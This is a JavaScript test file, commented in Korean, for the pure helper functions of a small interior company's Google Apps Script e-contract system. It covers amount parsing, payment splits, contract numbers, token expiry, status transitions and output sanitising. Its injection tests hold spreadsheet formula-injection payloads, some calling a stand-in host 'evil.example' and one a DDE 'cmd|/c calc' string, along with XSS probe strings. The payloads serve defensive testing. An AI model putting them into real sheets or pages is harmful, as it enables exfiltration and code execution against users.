/** ============================================================
 * 만물인테리어 전자계약 — Pure.gs · Schema.gs 검사 항목
 * ------------------------------------------------------------
 * 무엇을 하는가
 *   · run.mjs 가 원본 .gs 를 vm 으로 평가해 넘겨준 PURE_EXPORTS / SCHEMA_EXPORTS 를
 *     실제로 불러 보고, 계약서에서 틀리면 안 되는 것들을 못박는다.
 *   · 못박는 기준은 "계약이 깨지는가"다. 예쁜 코드인지는 보지 않는다.
 *
 * 무엇을 하지 않는가
 *   · 원본을 복사하지 않는다. 이 파일 어디에도 Pure.gs 의 코드가 옮겨 적혀 있지 않다.
 *   · Sheets·Drive·시각·난수를 다루지 않는다. 시각은 전부 인자로 넣는다.
 *   · 통과시키려고 기대값을 코드에 맞춰 바꾸지 않는다. 어긋나면 코드가 틀린 것이다.
 *
 * ⚠ 이 파일이 초록불인데 정작 Pure.gs 가 망가져 있으면 아무 소용이 없다.
 *   그래서 완성 뒤 일부러 함수를 망가뜨려 실제로 빨간불이 나는지 확인했다(README 참고).
 * ============================================================ */

export default function register(T) {
  const { P, S, files, globalsOf,
          group, test, eq, notEq, ok, no, deepEq, throws, noThrow } = T;

  /* ============================================================
   * 0) 적재 — 검사가 헛돌고 있지 않은가
   * ============================================================ */
  group('0) 적재 — 원본을 진짜로 읽었는가');

  test('PURE_EXPORTS 에 담긴 이름이 전부 실재한다', () => {
    const missing = Object.keys(P).filter((k) => P[k] === undefined || P[k] === null);
    eq(missing.length, 0, `PURE_EXPORTS 에 빈 이름이 있습니다: ${missing}`);
  });

  test('버전 문자열이 붙어 있다', () => {
    eq(P.PURE_VERSION, 'contract-pure-v1', 'Pure.gs 버전');
    eq(S.SCHEMA_VERSION, 'contract-schema-v1', 'Schema.gs 버전');
  });

  test('Pure.gs 와 Schema.gs 의 전역 이름이 겹치지 않는다', () => {
    // Apps Script 는 모든 .gs 가 전역 하나를 함께 쓴다. 이름이 겹치면 경고 없이
    // 뒤에 올라온 쪽이 앞을 덮어쓴다 — 조용히 다른 함수가 불린다.
    const [pure, schema] = files.map(globalsOf);
    const dup = pure.filter((n) => schema.indexOf(n) >= 0);
    eq(dup.length, 0, `두 파일에 같은 이름이 있습니다: ${dup}`);
  });

  test('Pure.gs 는 Apps Script 문법만 쓴다(const·let·화살표함수·import 금지)', () => {
    // 붙여넣는 사람이 문법 오류로 막히지 않게 한 약속이다. 주석·문자열은 걸러낸다.
    const src = files[0].src
      .replace(/\/\*[\s\S]*?\*\//g, ' ')
      .replace(/(^|[^:])\/\/.*$/gm, '$1 ')
      .replace(/'(?:[^'\\]|\\.)*'/g, "''")
      .replace(/"(?:[^"\\]|\\.)*"/g, '""');
    no(/(^|[^\w$])(const|let)\s/.test(src), 'const/let 이 있습니다');
    no(/=>/.test(src), '화살표 함수가 있습니다');
    no(/(^|[^\w$])(import|export|require)\s*[\s({]/.test(src), 'import/export/require 가 있습니다');
    no(/(^|[^\w$])async\s/.test(src), 'async 가 있습니다');
    no(/`/.test(src), '템플릿 문자열이 있습니다');
  });

  /* ============================================================
   * 1) 금액 — normalizeAmount
   * ============================================================ */
  group('1) 금액 — normalizeAmount');

  test("'1,200,000원' 같은 사람 표기를 정수로 읽는다", () => {
    eq(P.normalizeAmount('1,200,000원'), 1200000, '쉼표와 원');
    eq(P.normalizeAmount('1 200 000'), 1200000, '띄어쓴 금액');
    eq(P.normalizeAmount(' 12,000 원 '), 12000, '앞뒤 공백');
    eq(P.normalizeAmount('0'), 0, '문자열 0');
  });

  test('음수는 0으로 떨어뜨린다 — 계약금액이 음수인 계약은 없다', () => {
    eq(P.normalizeAmount(-5), 0, '숫자 음수');
    eq(P.normalizeAmount('-5'), 0, '문자열 음수');
    eq(P.normalizeAmount('-1,000원'), 0, '표기된 음수');
    eq(P.normalizeAmount(-0.4), 0, '음의 소수');
  });

  test('숫자가 아닌 것은 전부 0 — 조용히 NaN 을 시트로 흘리지 않는다', () => {
    eq(P.normalizeAmount(NaN), 0, 'NaN');
    eq(P.normalizeAmount(Infinity), 0, 'Infinity');
    eq(P.normalizeAmount(-Infinity), 0, '-Infinity');
    eq(P.normalizeAmount('abc'), 0, '글자');
    eq(P.normalizeAmount('원'), 0, '단위만');
    eq(P.normalizeAmount(''), 0, '빈 문자열');
    eq(P.normalizeAmount('   '), 0, '공백만');
    eq(P.normalizeAmount(null), 0, 'null');
    eq(P.normalizeAmount(undefined), 0, 'undefined');
    eq(P.normalizeAmount({}), 0, '객체');
    eq(P.normalizeAmount(true), 0, '참/거짓은 금액이 아니다');
  });

  test('소수는 반올림해 원 단위로 못박는다', () => {
    eq(P.normalizeAmount(1234.4), 1234, '내림 쪽');
    eq(P.normalizeAmount(1234.5), 1235, '반올림');
    eq(P.normalizeAmount('1234.5'), 1235, '문자열 소수');
    eq(P.normalizeAmount(0.4), 0, '1원 미만');
    eq(P.normalizeAmount(0.5), 1, '0.5원은 1원');
  });

  test('결과는 언제나 정수다 — 시트에 1.0000000001 이 들어가지 않는다', () => {
    const xs = [0, 1, 7, 0.5, 1234.4999, '3,333,333', 1e12, '999999999999'];
    for (const x of xs) {
      const v = P.normalizeAmount(x);
      ok(Number.isInteger(v), `${JSON.stringify(x)} → ${v} 가 정수가 아닙니다`);
      ok(v >= 0, `${JSON.stringify(x)} → ${v} 가 음수입니다`);
    }
  });

  test('[기록] 자바스크립트 Number 의 버릇을 그대로 물려받는다', () => {
    // 고쳐야 할 결함은 아니다 — 이 값들은 validateCreateInput 의 범위 검사를 함께
    // 지나야 계약이 되고, 실제 입력창은 숫자만 받는다. 다만 바뀌면 알아야 하므로 못박는다.
    eq(P.normalizeAmount('1e3'), 1000, '지수 표기가 통과한다');
    eq(P.normalizeAmount('0x10'), 16, '16진수 표기가 통과한다');
    eq(P.normalizeAmount(['5']), 5, '원소 하나짜리 배열이 통과한다');
  });

  /* ============================================================
   * 2) 금액 — paymentPlan (합이 총액과 1원도 어긋나면 안 된다)
   * ============================================================ */
  group('2) 금액 — 계약금·중도금·잔금');

  const planSum = (t) => P.paymentPlan(t).reduce((a, x) => a + x.amount, 0);

  test('세 값의 합이 총액과 정확히 같다 — 0·1원·홀수·아주 큰 금액', () => {
    const cases = [0, 1, 2, 3, 5, 7, 9, 11, 99, 101, 999, 1001,
                   12345, 1200000, 3333333, 10000000000,
                   9007199254740991];   // 2^53-1. 이보다 크면 정수 자체가 부정확해진다.
    for (const t of cases) {
      eq(planSum(t), t, `총액 ${t} 의 합계`);
    }
  });

  test('0원부터 1만원까지 한 원도 빠짐없이 맞는다', () => {
    for (let t = 0; t <= 10000; t++) {
      const plan = P.paymentPlan(t);
      const sum = plan[0].amount + plan[1].amount + plan[2].amount;
      if (sum !== t) throw new Error(`총액 ${t} → 합계 ${sum}`);
      for (const p of plan) {
        if (p.amount < 0) throw new Error(`총액 ${t} → ${p.stage} 가 음수(${p.amount})`);
        if (!Number.isInteger(p.amount)) throw new Error(`총액 ${t} → ${p.stage} 가 정수가 아님`);
      }
    }
  });

  test('무작위 금액 3000개에서도 합이 맞는다', () => {
    // 씨앗 고정 LCG — 실패하면 같은 값으로 다시 재현할 수 있어야 한다.
    let seed = 20260730;
    const next = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    for (let i = 0; i < 3000; i++) {
      const t = Math.floor(next() * 5000000000);
      const sum = planSum(t);
      if (sum !== t) throw new Error(`총액 ${t} → 합계 ${sum} (seed 20260730, i=${i})`);
    }
  });

  test('문자열 총액도 같은 결과를 낸다', () => {
    deepEq(P.paymentPlan('1,200,000원'), P.paymentPlan(1200000), '표기만 다른 같은 금액');
    eq(planSum('1,200,000원'), 1200000, '문자열 총액의 합계');
  });

  test('음수·쓰레기 총액은 전부 0원 계획이 된다', () => {
    for (const bad of [-1, '-1', NaN, null, 'abc', undefined]) {
      eq(planSum(bad), 0, `${JSON.stringify(bad)} 의 합계`);
    }
  });

  test('잔금은 비율이 아니라 나머지다 — 계약금·중도금은 비율대로', () => {
    const plan = P.paymentPlan(1000000);
    eq(plan[0].amount, 500000, '계약금 50%');
    eq(plan[1].amount, 400000, '중도금 40%');
    eq(plan[2].amount, 100000, '잔금 나머지');
  });

  test('회차 이름·순번이 고정이다 — 바뀌면 이전 계약과 어긋난다', () => {
    const plan = P.paymentPlan(1000);
    deepEq(plan.map((x) => x.stage), ['down', 'mid', 'bal'], '단계 키');
    deepEq(plan.map((x) => x.label), ['계약금', '중도금', '잔금'], '한국어 이름');
    deepEq(plan.map((x) => x.seq), [0, 1, 2], '순번');
    eq(P.PAYMENT_RATIO.down + P.PAYMENT_RATIO.mid + P.PAYMENT_RATIO.bal, 1, '비율 합계');
  });

  /* ============================================================
   * 3) 금액 — 미수금·합계·표기
   * ============================================================ */
  group('3) 금액 — 미수금과 표기');

  // 미수금 계산은 없앴다(2026-08-13 대표 결정 — 입금 여부는 통장을 본다).
  // 회차 금액의 합계는 계약서 제3조를 확인하는 데 쓰이므로 남는다.
  test('회차 합계는 회차 금액을 그대로 더한다', () => {
    const ps = [{ amount: 500000 }, { amount: 400000 }, { amount: 100000 }];
    eq(P.sumPayments(ps), 1000000, '전체 합');
    eq(P.sumPayments(undefined), 0, 'undefined');
    eq(P.sumPayments([]), 0, '빈 배열');
  });

  test('미수금 계산은 더 이상 제공하지 않는다', () => {
    // 되살아나면 대표 결정과 어긋난 채로 화면·CSV 가 다시 붙는다.
    eq(typeof P.outstanding, 'undefined', 'outstanding 이 없어야 한다');
  });

  test('금액 표기에 세 자리마다 쉼표가 들어간다', () => {
    eq(P.formatWon(0), '0', '0원');
    eq(P.formatWon(100), '100', '세 자리');
    eq(P.formatWon(1000), '1,000', '네 자리');
    eq(P.formatWon(1200000), '1,200,000', '백이십만');
    eq(P.formatWon(1234567890), '1,234,567,890', '십억대');
    eq(P.formatWon(-5), '0', '음수는 0원');
    eq(P.formatWon('1,200,000원'), '1,200,000', '이미 표기된 값을 다시 넣어도 같다');
  });

  /* ============================================================
   * 4) 계약번호
   * ============================================================ */
  group('4) 계약번호 MM-YYYY-NNNN');

  test('사람이 부르는 모양으로 만든다', () => {
    eq(P.makeContractNo(2026, 142), 'MM-2026-0142', '기본');
    eq(P.makeContractNo(2026, 1), 'MM-2026-0001', '한 자리');
    eq(P.makeContractNo(2026, 9999), 'MM-2026-9999', '네 자리');
    eq(P.makeContractNo('2026', '142'), 'MM-2026-0142', '문자열로 들어와도 같다');
  });

  test('왕복해도 값이 그대로다', () => {
    for (const y of [2000, 2026, 2099, 9999]) {
      for (const n of [1, 2, 9, 10, 99, 100, 999, 1000, 4242, 9999]) {
        const s = P.makeContractNo(y, n);
        deepEq(P.parseContractNo(s), { year: y, seq: n }, `왕복 ${s}`);
      }
    }
  });

  test('범위 밖 입력은 만들지 않고 멈춘다', () => {
    throws(() => P.makeContractNo(1999, 1), /연도/, '2000년 이전');
    throws(() => P.makeContractNo(10000, 1), /연도/, '다섯 자리 연도');
    throws(() => P.makeContractNo('스물스물', 1), /연도/, '글자 연도');
    throws(() => P.makeContractNo(2026, 0), /일련번호/, '0번');
    throws(() => P.makeContractNo(2026, -1), /일련번호/, '음수');
    throws(() => P.makeContractNo(2026, 10000), /일련번호/, '만 번째');
    throws(() => P.makeContractNo(2026, NaN), /일련번호/, 'NaN');
    throws(() => P.makeContractNo(2026, null), /일련번호/, 'null');
  });

  test('경계값은 통과한다 — 지나친 방어로 정상 번호를 막지 않는다', () => {
    noThrow(() => P.makeContractNo(2000, 1), '2000년 1번');
    noThrow(() => P.makeContractNo(9999, 9999), '9999년 9999번');
  });

  test('모양이 다른 문자열은 읽지 않고 null 을 준다', () => {
    for (const bad of ['MM-2026-142', 'mm-2026-0142', 'MM-26-0142', 'MM-2026-01420',
                       'XX-2026-0142', '2026-0142', '', null, undefined, 'MM-2026-0142 뒤에글자']) {
      eq(P.parseContractNo(bad), null, `${JSON.stringify(bad)} 는 계약번호가 아니다`);
    }
  });

  test('앞뒤 공백은 다듬어 읽는다 — 복사붙여넣기로 들어오는 값이다', () => {
    deepEq(P.parseContractNo('  MM-2026-0142  '), { year: 2026, seq: 142 }, '공백 낀 번호');
  });

  /* ============================================================
   * 5) 시트 수식 삽입 방지
   * ============================================================ */
  group('5) 시트 수식 삽입 방지');

  // 시트를 여는 순간 실행되는 것들. 하나라도 새면 사장님 시트에서 남의 코드가 돈다.
  const ATTACKS = [
    '=IMPORTXML("http://evil.example/x","//a")',
    '=HYPERLINK("http://evil.example","클릭")',
    '=1+1',
    '+1',
    '+IMPORTDATA("http://evil.example")',
    '-1',
    '-2+3',
    '@x',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
    '\n=1+1',
    '\r\n=cmd|/c calc'
  ];

  test('= + - @ 와 탭·개행으로 시작하는 값은 전부 글자로 못박힌다', () => {
    for (const a of ATTACKS) {
      const safe = P.sheetSafe(a);
      eq(safe.charAt(0), "'", `막히지 않았습니다: ${JSON.stringify(a)}`);
      eq(safe, "'" + a, `원래 값이 남아 있어야 합니다: ${JSON.stringify(a)}`);
    }
  });

  test('막은 값을 읽으면 원래 값으로 정확히 돌아온다', () => {
    for (const a of ATTACKS) {
      eq(P.sheetUnsafeStrip(P.sheetSafe(a)), a, `왕복 실패: ${JSON.stringify(a)}`);
    }
  });

  // 과잉 방어도 결함이다. 고객 이름에 없던 따옴표가 생기면 계약서에 그대로 찍힌다.
  const NORMALS = [
    '홍길동', '김철수', '(주)만물인테리어', '전병덕',
    '대전 서구 둔산동 1234-5', '101동 1503호',
    '010-2397-8629', '1,200,000원', '3.3㎡', '25평',
    '도배·장판·욕실', 'A/S 요청', 'a=b', '가격=협의',
    '#1 현장', '*중요*', '"인용"', "작은'따옴표", '~물결',
    ' 앞에공백', '뒤에공백 ', '0원', '2026-07-30',
    'https://example.com/x?y=1', 'MM-2026-0142',
    '여러\n줄이지만\n앞은 글자', ''
  ];

  test('정상 문자열은 한 글자도 바뀌지 않는다', () => {
    for (const s of NORMALS) {
      eq(P.sheetSafe(s), s, `건드리면 안 되는 값이 바뀌었습니다: ${JSON.stringify(s)}`);
      eq(P.sheetUnsafeStrip(P.sheetSafe(s)), s, `왕복 실패: ${JSON.stringify(s)}`);
    }
  });

  test('숫자·참거짓은 문자열로 바꾸지 않는다 — 시트가 숫자 칸으로 잡아야 한다', () => {
    eq(P.sheetSafe(1200000), 1200000, '숫자');
    eq(P.sheetSafe(0), 0, '0');
    eq(P.sheetSafe(-5), -5, '음수도 숫자면 그대로');
    eq(P.sheetSafe(true), true, '참');
    eq(P.sheetSafe(false), false, '거짓');
  });

  test('빈 값은 빈 칸이 된다', () => {
    eq(P.sheetSafe(null), '', 'null');
    eq(P.sheetSafe(undefined), '', 'undefined');
  });

  test('읽기 함수는 문자열이 아닌 것을 건드리지 않는다', () => {
    eq(P.sheetUnsafeStrip(1200000), 1200000, '숫자');
    eq(P.sheetUnsafeStrip(null), null, 'null');
    eq(P.sheetUnsafeStrip(true), true, '참');
  });

  test('사용자가 직접 넣은 작은따옴표는 살아남는다', () => {
    // 시트가 아니라 사람이 쓴 따옴표다. 읽을 때 임의로 떼면 이름이 달라진다.
    eq(P.sheetUnsafeStrip("'홍길동"), "'홍길동", '따옴표 + 글자');
    eq(P.sheetSafe("'홍길동"), "'홍길동", '쓸 때도 그대로');
  });

  test("[한계] \"'\" 다음에 =+-@ 가 오는 입력은 왕복이 되지 않는다", () => {
    // 막는 표시와 사람이 친 따옴표를 구분할 방법이 없어서 생기는 한계다.
    // 안전 쪽으로는 문제가 없다(수식은 여전히 실행되지 않는다). 다만 읽을 때
    // 따옴표 한 글자가 사라진다. 알고 있는 한계이므로 여기 못박아 둔다.
    // → 고칠 때는 '막았음' 표시를 값이 아닌 다른 곳에 두는 설계 변경이 필요하다.
    eq(P.sheetUnsafeStrip(P.sheetSafe("'=x")), '=x', "\"'=x\" 는 =x 로 읽힌다");
    eq(P.sheetSafe("'=x"), "'=x", '쓸 때는 그대로 나간다(수식으로 실행되지 않는다)');
  });

  test('[미확정] 공백 뒤 등호는 막지 않는다 — 실제 시트에서 확인이 필요하다', () => {
    // 구글시트가 " =1+1" 의 앞 공백을 떼고 수식으로 읽는지 여부는 Node 로 확인할 수 없다.
    // 지금 동작을 못박아 두고, 수동검증-체크리스트.md 에서 사람이 직접 확인한다.
    eq(P.sheetSafe(' =1+1'), ' =1+1', '지금은 그대로 나간다');
  });

  /* ============================================================
   * 6) HTML 이스케이프
   * ============================================================ */
  group('6) HTML 이스케이프');

  test('스크립트 태그가 글자가 된다', () => {
    eq(P.escHtml('<script>alert(1)</script>'),
       '&lt;script&gt;alert(1)&lt;/script&gt;', '스크립트');
    eq(P.escHtml('<img src=x onerror=alert(1)>'),
       '&lt;img src=x onerror=alert(1)&gt;', '이미지 태그');
  });

  test('따옴표와 앰퍼샌드가 전부 바뀐다', () => {
    eq(P.escHtml('"'), '&quot;', '큰따옴표');
    eq(P.escHtml("'"), '&#39;', '작은따옴표');
    eq(P.escHtml('&'), '&amp;', '앰퍼샌드');
    eq(P.escHtml('<'), '&lt;', '여는 꺾쇠');
    eq(P.escHtml('>'), '&gt;', '닫는 꺾쇠');
  });

  test('앰퍼샌드를 먼저 바꾼다 — 두 번 바뀌지 않는다', () => {
    // & 를 나중에 바꾸면 &lt; 가 &amp;lt; 가 아니라 &lt;lt; 처럼 망가진다.
    eq(P.escHtml('&lt;'), '&amp;lt;', '이미 이스케이프된 글자');
    eq(P.escHtml('&amp;'), '&amp;amp;', '이중 앰퍼샌드');
  });

  test('속성 안에 넣어도 빠져나갈 구멍이 없다', () => {
    const evil = `" onmouseover="alert(1)`;
    const out = P.escHtml(evil);
    no(/"/.test(out), '큰따옴표가 살아 있습니다');
    eq(out, '&quot; onmouseover=&quot;alert(1)', '전체 결과');
  });

  test('어떤 입력에도 위험한 글자가 남지 않는다', () => {
    const corpus = ['<', '>', '"', "'", '&', '<<>>', '</script><script>',
                    '홍길동<b>', '=1+1<script>', '&#x3c;script&#x3e;'];
    for (const s of corpus) {
      const out = P.escHtml(s);
      no(/[<>"'&](?!(amp|lt|gt|quot|#39);)/.test(out.replace(/&(amp|lt|gt|quot|#39);/g, ' ')),
         `위험한 글자가 남았습니다: ${JSON.stringify(s)} → ${JSON.stringify(out)}`);
    }
  });

  test('빈 값은 빈 문자열이다 — "null" 이라는 글자가 계약서에 찍히지 않는다', () => {
    eq(P.escHtml(null), '', 'null');
    eq(P.escHtml(undefined), '', 'undefined');
    eq(P.escHtml(''), '', '빈 문자열');
    eq(P.escHtml(0), '0', '숫자 0 은 글자 0');
  });

  test('평범한 한국어는 그대로 남는다', () => {
    eq(P.escHtml('만물인테리어 도배 공사'), '만물인테리어 도배 공사', '한글');
    eq(P.escHtml('1,200,000원'), '1,200,000원', '금액');
  });

  /* ============================================================
   * 7) 정규화 JSON · 문서 지문
   * ============================================================ */
  group('7) 정규화 JSON 과 문서 지문');

  test('키 순서가 달라도 같은 결과가 나온다', () => {
    eq(P.canonicalJson({ b: 1, a: 2 }), P.canonicalJson({ a: 2, b: 1 }), '한 겹');
    eq(P.canonicalJson({ z: { y: 1, x: 2 }, a: 3 }),
       P.canonicalJson({ a: 3, z: { x: 2, y: 1 } }), '두 겹');
    eq(P.canonicalJson({ list: [{ q: 1, p: 2 }] }),
       P.canonicalJson({ list: [{ p: 2, q: 1 }] }), '배열 안 객체');
  });

  test('배열 순서는 뜻이 있으므로 유지한다', () => {
    notEq(P.canonicalJson([1, 2]), P.canonicalJson([2, 1]), '숫자 배열');
    notEq(P.canonicalJson({ 조항: ['가', '나'] }), P.canonicalJson({ 조항: ['나', '가'] }), '조항 순서');
  });

  test('값이 다르면 결과가 다르다', () => {
    notEq(P.canonicalJson({ a: 1 }), P.canonicalJson({ a: 2 }), '값');
    notEq(P.canonicalJson({ a: 1 }), P.canonicalJson({ b: 1 }), '키 이름');
    notEq(P.canonicalJson({ a: '1' }), P.canonicalJson({ a: 1 }), '문자열과 숫자');
  });

  test('문서 지문이 금액을 함께 묶는다 — 본문만 두고 금액을 바꿔치기할 수 없다', () => {
    const body = { site: '대전 둔산동', scope: ['도배', '장판'] };
    const a = P.docHashSource(1200000, body);
    const b = P.docHashSource(1200001, body);
    notEq(a, b, '1원만 달라도 지문 재료가 달라야 합니다');
    ok(a.indexOf('1200000') >= 0, '금액이 재료에 들어 있어야 합니다');
  });

  test('본문의 키 순서만 다른 것은 같은 지문 재료다', () => {
    eq(P.docHashSource(1200000, { a: 1, b: 2 }),
       P.docHashSource(1200000, { b: 2, a: 1 }), '키 순서');
  });

  test('금액 표기가 달라도 같은 금액이면 같다', () => {
    eq(P.docHashSource('1,200,000원', { a: 1 }),
       P.docHashSource(1200000, { a: 1 }), '표기만 다른 금액');
  });

  test('본문이 없어도 멈추지 않는다', () => {
    noThrow(() => P.docHashSource(1000, null), 'null 본문');
    noThrow(() => P.docHashSource(1000, undefined), 'undefined 본문');
    notEq(P.docHashSource(1000, null), P.docHashSource(1000, {}), 'null 과 빈 객체는 다르다');
  });

  test('같은 입력이면 몇 번을 불러도 같은 결과다', () => {
    const body = { z: 1, a: [3, { m: 1, b: 2 }] };
    eq(P.canonicalJson(body), P.canonicalJson(body), '두 번 호출');
    eq(P.canonicalJson(JSON.parse(JSON.stringify(body))), P.canonicalJson(body), '복사본');
  });

  /* ============================================================
   * 8) 토큰 상태
   * ============================================================ */
  group('8) 고객 링크 토큰 상태');

  const NOW = '2026-07-30T12:00:00.000Z';
  const PAST = '2026-07-30T11:00:00.000Z';
  const FUTURE = '2026-07-31T12:00:00.000Z';

  test('무효 > 사용됨 > 만료 순으로 판정한다', () => {
    // 셋이 겹칠 때 무엇으로 답하는지가 고객 화면의 안내 문구를 가른다.
    eq(P.tokenState({ revokedAt: PAST, usedAt: PAST, expiresAt: PAST }, NOW), 'revoked', '셋 다');
    eq(P.tokenState({ usedAt: PAST, expiresAt: PAST }, NOW), 'used', '사용 + 만료');
    eq(P.tokenState({ revokedAt: PAST, expiresAt: FUTURE }, NOW), 'revoked', '무효 + 유효기간 남음');
    eq(P.tokenState({ usedAt: PAST, expiresAt: FUTURE }, NOW), 'used', '사용 + 유효기간 남음');
    eq(P.tokenState({ expiresAt: PAST }, NOW), 'expired', '만료만');
    eq(P.tokenState({ expiresAt: FUTURE }, NOW), 'ok', '멀쩡함');
  });

  test('줄이 없으면 unknown — 없는 토큰을 정상으로 보지 않는다', () => {
    eq(P.tokenState(null, NOW), 'unknown', 'null');
    eq(P.tokenState(undefined, NOW), 'unknown', 'undefined');
  });

  test('시트에서 온 빈 칸은 "값 없음"으로 읽는다', () => {
    // readAll_ 은 빈 칸을 '' 로 준다. '' 를 "무효 처리됨"으로 읽으면 멀쩡한 링크가 다 죽는다.
    eq(P.tokenState({ revokedAt: '', usedAt: '', expiresAt: FUTURE }, NOW), 'ok', '빈 문자열');
  });

  test('만료 시각이 없는 줄은 죽은 것으로 본다', () => {
    eq(P.tokenState({}, NOW), 'expired', '만료 칸이 비었음');
    eq(P.tokenState({ expiresAt: '' }, NOW), 'expired', '빈 만료');
  });

  test('만료 판정은 딱 그 순간부터 만료다', () => {
    eq(P.isExpired(NOW, NOW), true, '같은 시각이면 만료');
    eq(P.isExpired(PAST, NOW), false, '아직 남음');
    eq(P.isExpired(FUTURE, NOW), true, '지났음');
  });

  test('시각을 읽을 수 없으면 만료로 판정한다 — 못 읽는 값을 통과시키지 않는다', () => {
    eq(P.isExpired('말도 안 되는 날짜', FUTURE), true, '현재 시각이 이상함');
    eq(P.isExpired(NOW, '말도 안 되는 날짜'), true, '만료 시각이 이상함');
    eq(P.isExpired('', ''), true, '둘 다 빈 값');
    eq(P.isExpired(null, null), true, '둘 다 null');
    eq(P.isExpired(undefined, FUTURE), true, 'undefined 현재');
    eq(P.isExpired(NOW, '2026-13-45T99:99:99Z'), true, '없는 날짜');
    eq(P.isExpired(NOW, '2026-07-31'), false, '날짜만 있는 값은 읽을 수 있다');
  });

  /* ============================================================
   * 9) 상태 전이
   * ============================================================ */
  group('9) 계약 상태 전이');

  test('완료된 계약은 어디로도 못 간다', () => {
    for (const to of P.ALL_STATUS) {
      no(P.canTransition(P.STATUS.COMPLETED, to), `COMPLETED → ${to} 가 열려 있습니다`);
    }
  });

  test('취소된 계약은 어디로도 못 간다', () => {
    for (const to of P.ALL_STATUS) {
      no(P.canTransition(P.STATUS.VOID, to), `VOID → ${to} 가 열려 있습니다`);
    }
  });

  test('아무 상태도 DRAFT 로 되돌아가지 않는다', () => {
    for (const from of P.ALL_STATUS) {
      no(P.canTransition(from, P.STATUS.DRAFT), `${from} → DRAFT 가 열려 있습니다`);
    }
  });

  test('정해진 길만 열려 있다', () => {
    ok(P.canTransition('DRAFT', 'LOCKED'), 'DRAFT → LOCKED');
    ok(P.canTransition('LOCKED', 'SENT'), 'LOCKED → SENT');
    ok(P.canTransition('SENT', 'VIEWED'), 'SENT → VIEWED');
    ok(P.canTransition('VIEWED', 'SIGNING'), 'VIEWED → SIGNING');
    ok(P.canTransition('SIGNING', 'COMPLETED'), 'SIGNING → COMPLETED');
    no(P.canTransition('DRAFT', 'SENT'), '잠그지 않고 보낼 수 없다');
    no(P.canTransition('DRAFT', 'COMPLETED'), '잠그지 않고 완료할 수 없다');
    no(P.canTransition('LOCKED', 'COMPLETED'), '링크 없이 완료할 수 없다');
    no(P.canTransition('SENT', 'LOCKED'), '되돌아가지 않는다');
  });

  test('모든 상태에서 취소는 열려 있다 — 완료·취소된 것만 빼고', () => {
    for (const from of P.ALL_STATUS) {
      const expected = P.TERMINAL_STATUS.indexOf(from) < 0;
      eq(P.canTransition(from, P.STATUS.VOID), expected, `${from} → VOID`);
    }
  });

  test('모르는 상태는 전부 거부한다 — 조용히 통과시키지 않는다', () => {
    no(P.canTransition('없는상태', 'LOCKED'), '출발이 모르는 상태');
    no(P.canTransition('DRAFT', '없는상태'), '도착이 모르는 상태');
    no(P.canTransition('', ''), '빈 값');
    no(P.canTransition(null, null), 'null');
    no(P.canTransition('draft', 'locked'), '소문자는 다른 상태다');
  });

  test('[결함기록] 물려받은 이름이 오면 false 가 아니라 오류가 난다 — Pure.gs 를 고쳐야 한다', () => {
    // canTransition 은 TRANSITIONS[from] 을 그냥 읽는다. from 이 'constructor'·'toString'·
    // '__proto__' 처럼 Object.prototype 에 있는 이름이면 물려받은 값이 잡혀 truthy 가 되고,
    // 그 값에 .indexOf 가 없어서 TypeError 로 터진다. 주석이 약속한 "모르는 전이는 거부한다"가
    // 지켜지지 않는 자리다.
    //
    // 고치는 법(Code.gs 의 gwLookup_ 이 같은 함정을 이미 이렇게 피하고 있다):
    //   if (!Object.prototype.hasOwnProperty.call(TRANSITIONS, String(from||''))) return false;
    //
    // 고친 뒤에는 이 검사가 실패한다. 그때 이 test 를 지우고 위 test 에 한 줄을 되돌려 넣어라.
    for (const bad of ['constructor', 'toString', '__proto__', 'hasOwnProperty', 'valueOf']) {
      throws(() => P.canTransition(bad, 'LOCKED'), /indexOf/, `${bad} — 지금은 오류가 난다`);
    }
    // 도착 쪽은 배열의 indexOf 로만 보므로 안전하다.
    no(P.canTransition('DRAFT', 'constructor'), '도착이 물려받은 이름이면 정상적으로 거부한다');
  });

  test('전이표가 상태 목록과 어긋나지 않는다', () => {
    for (const s of P.ALL_STATUS) {
      ok(Object.prototype.hasOwnProperty.call(P.TRANSITIONS, s), `전이표에 ${s} 가 없습니다`);
    }
    for (const from of Object.keys(P.TRANSITIONS)) {
      ok(P.ALL_STATUS.indexOf(from) >= 0, `전이표에 모르는 상태가 있습니다: ${from}`);
      for (const to of P.TRANSITIONS[from]) {
        ok(P.ALL_STATUS.indexOf(to) >= 0, `${from} → 모르는 상태 ${to}`);
      }
    }
  });

  test('되돌릴 수 없는 상태는 완료와 취소뿐이다', () => {
    ok(P.isTerminal('COMPLETED'), 'COMPLETED');
    ok(P.isTerminal('VOID'), 'VOID');
    for (const s of ['DRAFT', 'LOCKED', 'SENT', 'VIEWED', 'SIGNING']) {
      no(P.isTerminal(s), `${s} 는 되돌릴 수 없는 상태가 아니다`);
    }
    no(P.isTerminal(''), '빈 값');
    no(P.isTerminal(null), 'null');
    no(P.isTerminal('completed'), '소문자는 다른 값');
  });

  test('본문 수정은 잠금 전 DRAFT 에서만 열린다', () => {
    ok(P.canEditBody({ status: 'DRAFT' }), 'DRAFT 는 고칠 수 있다');
    ok(P.canEditBody({}), '상태가 비면 DRAFT 로 본다');
    no(P.canEditBody({ status: 'DRAFT', lockedAt: '2026-07-30T00:00:00Z' }), '잠근 뒤에는 못 고친다');
    no(P.canEditBody({ status: 'LOCKED' }), 'LOCKED');
    no(P.canEditBody({ status: 'SENT' }), 'SENT');
    no(P.canEditBody({ status: 'VIEWED' }), 'VIEWED');
    no(P.canEditBody({ status: 'SIGNING' }), 'SIGNING');
    no(P.canEditBody({ status: 'COMPLETED' }), 'COMPLETED');
    no(P.canEditBody({ status: 'VOID' }), 'VOID');
    no(P.canEditBody(null), '없는 계약');
    no(P.canEditBody(undefined), 'undefined');
  });

  test('잠금 시각이 빈 문자열이면 아직 잠기지 않은 것이다', () => {
    // 시트는 빈 칸을 '' 로 준다. '' 를 잠금으로 읽으면 만든 즉시 못 고치는 계약이 된다.
    ok(P.canEditBody({ status: 'DRAFT', lockedAt: '' }), '빈 잠금 시각');
  });

  /* ============================================================
   * 10) 입력 검증 — 계약 생성
   * ============================================================ */
  group('10) 입력 검증 — 계약 생성');

  const GOOD_CREATE = {
    title: '둔산동 아파트 도배·장판',
    amount: 12000000,
    customer: { name: '홍길동', phone: '010-9876-5432' }
  };

  test('틀린 것을 하나씩이 아니라 전부 모아서 돌려준다', () => {
    const r = P.validateCreateInput({});
    no(r.ok, '통과하면 안 됩니다');
